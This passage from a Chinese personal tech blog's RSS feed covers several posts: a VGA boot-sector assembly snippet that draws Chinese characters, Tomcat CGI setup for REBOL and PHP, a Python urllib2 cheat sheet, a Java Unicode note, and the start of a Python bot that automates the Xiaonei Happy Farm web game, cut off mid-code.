;设置映象屏蔽寄存器<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov dx,sequen_ctl<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al,2<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; out dx,al<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc dx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al,0fh&nbsp;&nbsp; ;四个位面全部充许写<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; out dx,al<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;选择写方式2<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov dx,graphi_ctl<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al,5<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; out dx,al<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc dx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al,2<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; out dx,al<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;计算屏蔽码,并设置位屏蔽寄存器<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dec dx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al,8<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; out dx,al<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov cx,[bp]&nbsp; ;取出X坐标<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and cl,7<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al,80h<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; shr al,cl<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc dx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; out dx,al<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;写数据<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ax,vgaseg&nbsp; ;ES段指向显存地址0a000h<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov es,ax<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ax,[bp+2]&nbsp;&nbsp;&nbsp;&nbsp; ;取颜色值<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ah,[es:di]&nbsp;&nbsp;&nbsp; ;读一次使屏蔽寄存器有效<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov [es:di],al ;写入显示存储器<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp; bx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp; cx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp; di<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp; ax<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp; dx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp; bp<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp; es<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret<br><br>chineseS: <br>&nbsp;&nbsp;&nbsp; ;正&nbsp;&nbsp; CD5FD<br>&nbsp;&nbsp;&nbsp; dw 00000H,07FFEH,00080H,00080H,00080H,00080H,01080H,010FCH<br>&nbsp;&nbsp;&nbsp; dw 01080H,01080H,01080H,01080H,01080H,0FFFEH,00000H,00000H<br><br>&nbsp;&nbsp;&nbsp; ;在&nbsp;&nbsp; CD4DA<br>&nbsp;&nbsp;&nbsp; dw 00200H,00200H,07FFEH,00400H,00400H,00840H,01840H,017FCH<br>&nbsp;&nbsp;&nbsp; dw 03040H,05040H,09040H,01040H,01040H,017FEH,01000H,00000H<br><br>&nbsp;&nbsp;&nbsp; ;加&nbsp;&nbsp; CBCD3<br>&nbsp;&nbsp;&nbsp; dw 00800H,00800H,00800H,07F7CH,00944H,00944H,00944H,00944H<br>&nbsp;&nbsp;&nbsp; dw 01144H,01144H,01144H,02144H,0217CH,04544H,08240H,00000H<br><br>&nbsp;&nbsp;&nbsp; ;载&nbsp;&nbsp; CD4D8<br>&nbsp;&nbsp;&nbsp; dw 00440H,00450H,03F48H,00440H,0FFFEH,00840H,07F44H,01044H<br>&nbsp;&nbsp;&nbsp; dw 02428H,07F28H,00430H,00730H,07C52H,0048AH,00504H,00400H<br><br>&nbsp;&nbsp;&nbsp; ;系&nbsp;&nbsp; CCFB5<br>&nbsp;&nbsp;&nbsp; dw 0007CH,03F80H,00220H,00420H,00840H,01F80H,00320H,00C10H<br>&nbsp;&nbsp;&nbsp; dw 03FF8H,0108CH,004A0H,00890H,01088H,02084H,04284H,00100H<br><br>&nbsp;&nbsp;&nbsp; ;统&nbsp;&nbsp; CCDB3<br>&nbsp;&nbsp;&nbsp; dw 01040H,01020H,023FEH,02040H,04440H,0F888H,00904H,013FEH<br>&nbsp;&nbsp;&nbsp; dw 02094H,07C90H,00090H,00090H,01D12H,0E112H,0020EH,00400H<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; dw 00000h,00000h,00000h,00000h,00000h,00000h,00000h,00000h<br>&nbsp;&nbsp;&nbsp; dw 0FFFFh,0FFFFh,00000h,00000h,00000h,00000h,00000h,00000h&nbsp;&nbsp; ; “一”字的字型信息<br><br>times 510-($-$$) db 0<br>endSign: <br>&nbsp;&nbsp;&nbsp; dw 0xAA55<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200911192325600/</guid>
    </item>
    <item>
      <title>
<![CDATA[让Tomcat支持REBOL的CGI]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720084905024954/</link>
      <description>
<![CDATA[和支持php基本一样<br>修改&lt;tomcat&gt;/conf/web.xml，rebol的cgi的Servlet和Mapping<br>环境：D:\software\rebol\rebcore.exe + &lt;tomcat&gt;/lib/servlets-cgi.jar<br>注意 rebcore -c才是执行脚本，如果没有-c参数，则只会在服务器上闪一下，没有输出。 <br>而且，如果脚本里有写文件的操作，还需要加上s(secure)参数，即rebcore -cs<br>test.cgi<br>REBOL [Title: "Server Time"]<br>print "content-type: text/html^/"<br>print [&lt;HTML&gt;&lt;BODY&gt;]<br>print ["Date/time is:" now]<br>print [&lt;/BODY&gt;&lt;/HTML&gt;]<br><br>&nbsp;&nbsp;&nbsp; &lt;!-- hankjin rebol --&gt;<br>&nbsp;&nbsp;&nbsp; &lt;servlet&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;servlet-name&gt;rebol&lt;/servlet-name&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;init-param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-name&gt;clientInputTimeout&lt;/param-name&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-value&gt;100&lt;/param-value&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/init-param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;init-param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-name&gt;debug&lt;/param-name&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-value&gt;0&lt;/param-value&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/init-param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;init-param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-name&gt;executable&lt;/param-name&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-value&gt;D:\software\rebol\rebcore.exe -c&lt;/param-value&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/init-param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;init-param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-value&gt;WEB-INF/..&lt;/param-value&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/init-param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;load-on-startup&gt;5&lt;/load-on-startup&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/servlet&gt;<br><br>&nbsp;&nbsp;&nbsp; &lt;servlet-mapping&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;servlet-name&gt;rebol&lt;/servlet-name&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;url-pattern&gt;*.cgi&lt;/url-pattern&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/servlet-mapping&gt;<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720084905024954/</guid>
    </item>
    <item>
      <title>
<![CDATA[python访问web的利器：urllib2]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720105140583594/</link>
      <description>
<![CDATA[使用Python访问网页主要有三种方式： urllib, urllib2, httplib<br>urllib比较简单，功能相对也比较弱，httplib简单强大，但好像不支持session<br>1. 最简单的页面访问<br>res=urllib2.urlopen(url)<br>print res.read()<br>2. 加上要get或post的数据<br>data={"name":"hank", "passwd":"hjz"}<br>urllib2.urlopen(url, urllib.urlencode(data))<br>3. 加上http头<br>header={"User-Agent": "Mozilla-Firefox5.0"}<br>urllib2.urlopen(url, urllib.urlencode(data), header)<br><br><b>使用opener和handler<br></b>opener = urllib2.build_opener(handler)<br>
urllib2.install_opener(opener)<br>
4. 加上session<br>cj = cookielib.CookieJar()<br>cjhandler=urllib2.HTTPCookieProcessor(cj)<br>opener = urllib2.build_opener(cjhandler)<br>urllib2.install_opener(opener)<br>5. 加上Basic认证<br>password_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()<br>top_level_url = "http://www.163.com/"<br>password_mgr.add_password(None, top_level_url, username, password)<br>handler = urllib2.HTTPBasicAuthHandler(password_mgr)<br>opener = urllib2.build_opener(handler)<br>

urllib2.install_opener(opener)<br>

6. 使用代理<br>proxy_support = urllib2.ProxyHandler({"http":"http://1.2.3.4:3128/"})<br>opener = urllib2.build_opener(proxy_support)<br>urllib2.install_opener(opener)<br>7. 设置超时<br>socket.setdefaulttimeout(5)<br><br>参考：http://svn.python.org/projects/python/trunk/Doc/howto/urllib2.rst]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720105140583594/</guid>
    </item>
    <item>
      <title>
<![CDATA[Unicode4.0过16位了]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720095574857759/</link>
      <description>
<![CDATA[Java5支持Unicode4.0，而Unicode4.0定义了若干个大于16位的字符，因此导致Character.isUpperCase的参数从char变为int了。<br>想起了老赵的名言：这个世界太疯狂。人不学，不知道啊<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720095574857759/</guid>
    </item>
    <item>
      <title>
<![CDATA[让Tomcat支持php]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200832312652449/</link>
      <description>
<![CDATA[<P>在服务器上php的安装：<BR>1。下载php-4.4.2 for windows的压缩包<BR>2。解压缩到D:\software\php442<BR>3。将D:\software\php442增加到环境变量PATH中<BR>4。将php.ini-dist做一个备份，然后重命名为php.ini，修改<BR>extension_dir = "D:\software\php442\extensions"<BR>cgi.force_redirect = 0</P>  <P>5。Tomcat的配置：<BR>打开conf\web.xml，增加如下一段：</P>  <P>&nbsp;&lt;!-- hankjin php --&gt;<BR>&nbsp;&lt;servlet&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-name&gt;clientInputTimeout&lt;/param-name&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-value&gt;100&lt;/param-value&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-name&gt;debug&lt;/param-name&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-value&gt;0&lt;/param-value&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-name&gt;executable&lt;/param-name&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-value&gt;d:/software/php442/php.exe&lt;/param-value&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;param-value&gt;WEB-INF/..&lt;/param-value&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/init-param&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;load-on-startup&gt;5&lt;/load-on-startup&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;/servlet&gt;</P>  <P>&nbsp;&nbsp;&nbsp; &lt;servlet-mapping&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;url-pattern&gt;*.php&lt;/url-pattern&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;/servlet-mapping&gt;<BR>&nbsp;&lt;!-- end hankjin php --&gt;</P>  <P>6。到server\lib目录，将servlets-cgi.renametojar文件重命名为servlets-cgi.jar<BR>7。到一个Web Application下，新建一个test.php，内容为：<BR>&lt;?php phpinfo();?&gt;<BR>8。重启Tomcat服务器，访问这个test.php，OK</P>  <P>9。如果要用mysql，需要在修改my.ini</P>  <P>在max_connections=100下面加一行<BR>enable-named-pipe</P>  <P>并且连接用的IP要用.而且如果mysql服务器的版本比较高，还需要修改密码： </P>  <P>SET PASSWORD FOR <A rel="nofollow" href="mailto:modoer@'%'=OLD_PASSWORD('modoer'"  >modoer@'%'=OLD_PASSWORD('modoer'</A>);</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Admin</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200832312652449/</guid>
    </item>
    <item>
      <title>
<![CDATA[Python自动化校内开心农场]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200961535618341/</link>
      <description>
<![CDATA[登录成功，获取数据成功，翻地成功，播种成功，获取好友列表与好友详细信息成功，尚未解析返回数据的字段意义。<br>#!/usr/bin/env python<br>#encoding: utf-8<br>imp<wbr>ort urllib,urllib2,cookielib<br>imp<wbr>ort httplib2<br>imp<wbr>ort time,zlib,re,md5<br>imp<wbr>ort cStringIO,gzip<br>imp<wbr>ort json<br>class Xiaonei:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;debug=True<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#创建Cookie<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def __init__(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;cj=cookielib.LWPCookieJar()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;opener.addheaders=[('User-agent','Opera/9.23')]<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;urllib2.install_opener(opener)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 登录校内网<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def login(self, email, password):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url="http://login.xiaonei.com/Login.do"<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body=(("email",email),("password",password))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.req(url,body)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 请求网页的工具函数，直接返回网页内容<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def req(self,url,body=()):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(body)==0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;req=urllib2.Request(url)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;req=urllib2.Request(url,urllib.urlencode(body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;raw=urllib2.urlopen(req)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.debug: #输出调试信息<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print url<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print raw.headers<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return raw.read()<br><br>class Farm(Xiaonei):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;status={}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;friends={}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def param(self): # build params farmKey and farmTime<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farmTime=str(time.time())[0:10]<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farmKey=md5.md5(farmTime+'15l3h4kh').hexdigest()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return (farmKey, farmTime)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 获取校内网到开心网的链接地址,并取得Cookie<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def getFarm(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# build cookie to faminutes<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://apps.xiaonei.com/happyfarm?origin=103'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=re.findall('iframe_canvas" src="([^"]+)"',self.req(url))[0]<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=url.replace('?','/?') # fuck url, it lacks a '/'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;req=urllib2.Request(url)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;raw=urllib2.urlopen(req)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# read current status<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=user&amp;act=run&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.status=json.read(self.req(url))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 获取所有好友<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def listFriends(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url="http://xn.hf.fminutes.com/api.php?mod=friend&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=" % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body=({"refresh":"true"})<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.friends=json.read(self.req(url,body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 获取好友信息<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def showFriend(self,fid):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=user&amp;act=run&amp;flag=1&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'ownerId':fid}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 浇水 fid: 用户ID place:土地编号<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def water(self,fid,place):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=water&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'ownerId':fid,'place':place}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 除草 fid:用户ID place:土地编号<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def clearWeed(self,fid,place):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=clearWeed&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'ownerId':fid,'place':place}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 获取自己购买的物品<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def bag(self):<br>&nbsp;&nbsp; 